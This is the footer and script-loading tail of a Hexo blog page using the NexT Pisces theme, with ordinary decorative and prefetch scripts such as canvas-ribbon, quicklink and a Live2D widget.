    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:16</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
  <script>
      window.addEventListener('load', () => {
      quicklink({
        timeout : 3000,
        priority: true,
        ignores : [uri => uri.includes('#'),uri => uri === 'http://swanq.top/',]
      });
      });
  </script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
<script type="text/javascript" src="/js/src/clicklove.js"></script>
</html>
